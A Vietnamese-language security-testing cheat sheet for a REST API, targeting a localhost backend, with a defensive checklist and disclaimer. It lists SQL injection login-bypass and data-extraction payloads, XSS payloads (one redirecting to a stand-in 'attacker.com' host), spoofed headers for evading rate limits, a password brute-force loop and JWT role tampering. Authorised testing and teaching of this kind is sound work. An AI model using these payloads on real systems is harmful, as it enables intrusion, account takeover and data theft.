# 🔒 Security Testing Payloads cho REST API Backend

## 📖 Hướng Dẫn Kiểm Thử Bảo Mật

File này chứa các payload và kỹ thuật để kiểm thử bảo mật backend REST API. **Chỉ sử dụng trong môi trường test được phép.**

---

## 🔐 1. AUTHENTICATION TESTING

### 1.1 JWT Token Manipulation
```bash
# Test với token không hợp lệ
Authorization: Bearer fake_invalid_token
Authorization: Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.FAKE_PAYLOAD.FAKE_SIGNATURE

# Test token rỗng
Authorization: Bearer 
Authorization: 

# Test token đã hết hạn (có thể generate từ jwt.io)
Authorization: Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiIxMjM0NTY3ODkwIiwibmFtZSI6IkpvaG4gRG9lIiwiaWF0IjoxNTE2MjM5MDIyLCJleHAiOjE1MTYyMzkwMjJ9.expired_signature
```

### 1.2 Login Brute Force Attack
```bash
# Payload cho brute force
POST /api/auth/login
Content-Type: application/json

# Danh sách username phổ biến
usernames = ["admin", "administrator", "root", "user", "test", "guest", "demo"]

# Danh sách password phổ biến  
passwords = [
    "123456", "password", "admin", "12345678", "qwerty",
    "123456789", "letmein", "1234567", "football", "iloveyou",
    "admin123", "welcome", "monkey", "login", "abc123",
    "starwars", "123123", "dragon", "passw0rd", "master"
]

# Script test brute force
for username in usernames:
    for password in passwords:
        payload = {"username": username, "password": password}
        # Gửi request và check response
```

---

## 💉 2. SQL INJECTION TESTING

### 2.1 Authentication Bypass
```sql
-- Payload trong login form
username: admin'--
password: anything

username: ' OR '1'='1' --
password: anything

username: admin' OR 1=1--
password: anything

username: ' OR 'a'='a
password: ' OR 'a'='a
```

### 2.2 Union-Based SQL Injection
```sql
-- Test union select
username: ' UNION SELECT username, password FROM users--
username: ' UNION SELECT 1,2,3,4,5--
username: ' UNION SELECT null,username,password,null FROM users--

-- Information gathering
username: ' UNION SELECT table_name, null FROM information_schema.tables--
username: ' UNION SELECT column_name, null FROM information_schema.columns WHERE table_name='users'--
```

### 2.3 Time-Based Blind SQL Injection
```sql
-- MySQL time delay
username: admin'; SELECT SLEEP(5)--
username: admin' AND (SELECT SLEEP(5))--

-- PostgreSQL time delay  
username: admin'; SELECT pg_sleep(5)--

-- SQL Server time delay
username: admin'; WAITFOR DELAY '00:00:05'--
```

### 2.4 Error-Based SQL Injection
```sql
-- MySQL error injection
username: admin' AND (SELECT COUNT(*) FROM (SELECT 1 UNION SELECT 2 UNION SELECT 3)x GROUP BY CONCAT((SELECT version()),FLOOR(RAND(0)*2)))--

-- PostgreSQL error injection
username: admin' AND (SELECT CAST((SELECT version()) AS int))--
```

---

## ⚡ 3. API RATE LIMITING & DDOS TESTING

### 3.1 Rate Limit Bypass Headers
```bash
# Các header để bypass rate limiting
X-Forwarded-For: 192.168.1.100
X-Real-IP: 10.0.0.1  
X-Originating-IP: 172.16.0.1
X-Remote-IP: 203.0.113.1
X-Client-IP: 198.51.100.1
Client-IP: 233.252.0.1
Forwarded-For: 192.0.2.1
Forwarded: for=192.0.2.60;proto=http;by=203.0.113.43

# Rotate User-Agent
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36
User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36
```

### 3.2 Concurrent Request Testing
```bash
# Bash script để test rate limiting
#!/bin/bash
for i in {1..100}; do
    curl -X POST http://localhost:8080/api/auth/login \
    -H "Content-Type: application/json" \
    -H "X-Forwarded-For: 192.168.1.$i" \
    -d '{"username":"test","password":"test"}' &
done
wait
```

### 3.3 Resource Exhaustion
```bash
# Test với query parameters lớn
GET /api/products?limit=999999&offset=0
GET /api/products?search=a&limit=10000

# Upload file lớn (nếu có endpoint upload)
POST /api/upload
Content-Type: multipart/form-data
# Attach file > 100MB

# Nested JSON payload
POST /api/products
{
  "name": "test",
  "description": "a".repeat(1000000),
  "nested": {
    "level1": {
      "level2": {
        // ... deep nesting
      }
    }
  }
}
```

---

## 🔓 4. AUTHORIZATION & PRIVILEGE ESCALATION

### 4.1 IDOR (Insecure Direct Object Reference)
```bash
# Test truy cập user khác
GET /api/users/1      # Your user ID
GET /api/users/2      # Try other user ID  
GET /api/users/999    # Non-existent ID
GET /api/users/-1     # Negative ID
GET /api/users/admin  # String ID

# Test với product IDs
GET /api/products/1
PUT /api/products/1   # Try to modify
DELETE /api/products/1 # Try to delete
```

### 4.2 Role Manipulation
```bash
# Thử thay đổi role trong request
POST /api/auth/register
{
  "username": "newuser",
  "password": "password123",
  "role": "admin"
}

# Thử thêm role parameter
POST /api/products
{
  "name": "Test Product",
  "price": 100,
  "role": "admin"
}

# JWT payload manipulation (decode token và thay đổi role)
{
  "sub": "user123",
  "role": "admin",    # Change from "user" to "admin"
  "exp": 1234567890
}
```

### 4.3 Admin Function Access
```bash
# Thử truy cập admin endpoints
GET /api/admin/users
GET /api/admin/stats  
GET /api/admin/logs

# Thử admin functions
POST /api/products     # Should be admin only
PUT /api/products/1    # Should be admin only  
DELETE /api/products/1 # Should be admin only
```

---

## 🎭 5. XSS & INPUT VALIDATION TESTING

### 5.1 Stored XSS Payloads
```html
<!-- Basic XSS -->
<script>alert('XSS')</script>
<script>alert(document.cookie)</script>

<!-- Event-based XSS -->
<img src=x onerror=alert('XSS')>
<svg onload=alert('XSS')>
<iframe src=javascript:alert('XSS')>

<!-- Advanced XSS -->
<script>fetch('/api/products',{method:'DELETE'})</script>
<script>
  fetch('/api/auth/logout', {method: 'POST', credentials: 'include'})
  .then(() => window.location = 'http://attacker.com')
</script>

<!-- Filter bypass -->
<ScRiPt>alert('XSS')</ScRiPt>
<script>eval(String.fromCharCode(97,108,101,114,116,40,39,88,83,83,39,41))</script>
```

### 5.2 Product Input XSS
```json
// Test XSS trong product creation
POST /api/products
{
  "name": "<script>alert('XSS')</script>",
  "description": "<img src=x onerror=alert('Product XSS')>",
  "price": "<svg onload=alert('Price XSS')>"
}
```

---

## 📡 6. API ENDPOINT DISCOVERY

### 6.1 Common Endpoints
```bash
# Test các endpoint thường gặp
GET /api/
GET /api/v1/
GET /api/docs
GET /api/swagger
GET /.well-known/
GET /robots.txt
GET /sitemap.xml

# Admin endpoints
GET /admin
GET /api/admin
GET /dashboard
GET /console

# Debug endpoints
GET /debug
GET /api/debug
GET /health
GET /status
GET /metrics
```

### 6.2 HTTP Methods Testing
```bash
# Test tất cả HTTP methods
GET /api/products
POST /api/products  
PUT /api/products
DELETE /api/products
PATCH /api/products
HEAD /api/products
OPTIONS /api/products
TRACE /api/products
```

---

## 🔍 7. INFORMATION DISCLOSURE

### 7.1 Error Information
```bash
# Trigger errors để xem thông tin hệ thống
GET /api/products/abc123    # Invalid ID
GET /api/nonexistent        # 404 error
POST /api/products          # Missing required fields

# SQL errors
POST /api/auth/login
{
  "username": "admin'",
  "password": "test"
}
```

### 7.2 Debug Information
```bash
# Test debug headers
X-Debug: true
X-Test: true
Debug: 1

# Test debug parameters
GET /api/products?debug=true
GET /api/products?test=1
GET /api/products?verbose=true
```

---

## 🛠️ 8. TESTING TOOLS & SCRIPTS

### 8.1 Curl Commands
```bash
# Basic authentication test
curl -X POST http://localhost:8080/api/auth/login \
  -H "Content-Type: application/json" \
  -d '{"username":"admin","password":"admin"}'

# Test với invalid token
curl -X GET http://localhost:8080/api/products \
  -H "Authorization: Bearer invalid_token"

# Rate limit test
for i in {1..50}; do
  curl -X POST http://localhost:8080/api/auth/login \
    -H "Content-Type: application/json" \
    -d '{"username":"test'$i'","password":"wrong"}' &
done
```

### 8.2 Burp Suite / OWASP ZAP
```
1. Proxy traffic qua Burp/ZAP
2. Crawl tất cả endpoints
3. Run active scan
4. Test SQL injection
5. Test XSS payloads
6. Fuzz parameters
```

---

## ⚠️ 9. TESTING CHECKLIST

### 🔐 Authentication
- [ ] Brute force protection
- [ ] Account lockout mechanism  
- [ ] Password complexity
- [ ] JWT token validation
- [ ] Session management

### 🛡️ Authorization  
- [ ] Role-based access control
- [ ] IDOR vulnerabilities
- [ ] Privilege escalation
- [ ] Admin function protection

### ⚡ Rate Limiting
- [ ] API rate limits
- [ ] Login attempt limits
- [ ] Resource exhaustion protection
- [ ] DDoS mitigation

### 💉 Input Validation
- [ ] SQL injection protection
- [ ] XSS prevention
- [ ] File upload security
- [ ] JSON payload validation

### 📊 Information Security
- [ ] Error message leakage
- [ ] Debug information exposure
- [ ] API documentation security
- [ ] HTTP headers security

---

## 🚨 DISCLAIMER

**QUAN TRỌNG:** Các payload và kỹ thuật trong file này CHỈ được sử dụng để:

1. ✅ Testing trong môi trường development/staging được phép
2. ✅ Security assessment cho hệ thống của chính bạn
3. ✅ Mục đích giáo dục và học tập
4. ✅ Penetration testing có sự đồng ý

**KHÔNG được sử dụng để:**
- ❌ Tấn công hệ thống không có quyền
- ❌ Phá hoại dữ liệu  
- ❌ Truy cập trái phép
- ❌ Các hoạt động bất hợp pháp

---

## 📝 USAGE NOTES

1. **Backup dữ liệu** trước khi test
2. **Test trong môi trường isolated**  
3. **Document tất cả findings**
4. **Report vulnerabilities responsibly**
5. **Follow ethical hacking guidelines**

---

*File được tạo cho mục đích giáo dục và security testing. Sử dụng có trách nhiệm!* 